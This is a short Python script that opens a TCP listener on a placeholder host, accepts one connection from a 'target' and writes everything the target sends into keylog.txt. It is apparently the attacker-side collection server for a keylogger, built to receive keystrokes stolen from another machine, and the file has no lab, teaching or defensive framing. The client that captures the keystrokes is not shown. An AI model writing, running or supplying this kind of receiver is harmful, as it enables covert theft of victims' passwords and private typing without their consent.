import socket as sk
import os

LHOST = 'xxx.xxx.xxx.xxx'
PORT = 0

adrs = (LHOST, PORT)

server = sk.socket(sk.AF_INET, sk.SOCK_STREAM)

server.bind(adrs)
server.listen(1)

connection, target_IP = server.accept()

connection

target_IP = list(target_IP)
print(f'CONNECTED TO {target_IP}')

dirpath = os.path.dirname(__file__)
txt = os.path.join(dirpath, 'keylog.txt')
with open(txt, 'a+') as fil:
    fil.write('\n\n')

while True:
    keylog = connection.recv(1024)
    keylog = keylog.decode(errors='ignore')
    with open(txt, 'a+') as fil:
        fil.write(keylog)